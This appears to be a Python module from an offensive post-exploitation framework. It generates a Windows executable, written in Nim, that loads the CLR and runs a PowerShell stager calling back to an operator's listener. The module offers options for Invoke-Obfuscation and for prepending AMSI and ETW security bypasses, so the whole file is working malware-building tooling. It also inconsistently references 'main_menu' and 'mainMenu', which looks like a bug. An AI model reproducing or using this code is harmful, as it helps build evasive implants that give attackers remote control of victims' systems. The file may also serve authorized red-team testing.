import logging
import os

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, main_menu):
        self.info = {
            "Name": "Nim Powershell Launcher",
            "Authors": [
                {
                    "Name": "Jake Krasnov",
                    "Handle": "@hubbl3",
                    "Link": "https://twitter.com/_Hubbl3",
                }
            ],
            "Description": "Generate an unmanaged binary that loads the CLR and executes a powershell one liner",
            "Comments": ["Based on the work of @bytebl33d3r"],
        }

        self.options = {
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "Listener": {
                "Description": "Listener to use.",
                "Required": True,
                "Value": "",
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "Name to save File as.",
                "Required": False,
                "Value": "Launcher.exe",
            },
            "Obfuscate": {
                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "mattifestation etw",
            },
        }

        self.main_menu = main_menu

    def generate(self):
        # staging options
        language = self.options["Language"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]

        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]

        if (
            self.main_menu.listenersv2.get_active_listener_by_name(listener_name)
            is None
        ):
            # not a valid listener, return nothing for the script
            log.error("[!] Invalid listener: " + listener_name)
            return ""
        else:
            obfuscate_script = obfuscate.lower() == "true"

        if language in ["csharp", "ironpython"]:
            if (
                self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            launcher = self.mainMenu.stagers.generate_exe_oneliner(
                language=language,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                encode=False,
                listener_name=listener_name,
            )

        elif language == "powershell":
            launcher = self.main_menu.stagers.generate_launcher(
                listener_name,
                language=language,
                encode=False,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                stagerRetries=stager_retries,
                bypasses=self.options["Bypasses"]["Value"],
            )
        else:
            log.error("[!] Invalid launcher language.")
            return ""

        if launcher == "":
            log.error("[!] Error in launcher command generation.")
            return ""

        else:
            # Generate nim launcher from template
            with open(
                self.main_menu.installPath
                + "/data/module_source/nim/execute_powershell_bin.nim",
                "rb",
            ) as f:
                nim_source = f.read()
            nim_source = nim_source.decode("UTF-8")
            nim_source = nim_source.replace("{{ script }}", launcher)
            with open("/tmp/launcher.nim", "w") as f:
                f.write(nim_source)

            currdir = os.getcwd()
            os.chdir("/tmp/")
            os.system("nim c -d=mingw --app=console --cpu=amd64 launcher.nim")
            os.chdir(currdir)
            os.remove("/tmp/launcher.nim")

            # Create exe and send to client
            directory = "/tmp/launcher.exe"

            try:
                with open(directory, "rb") as f:
                    code = f.read()
                return code
            except OSError:
                log.error("Could not read file at " + str(directory))
                return ""
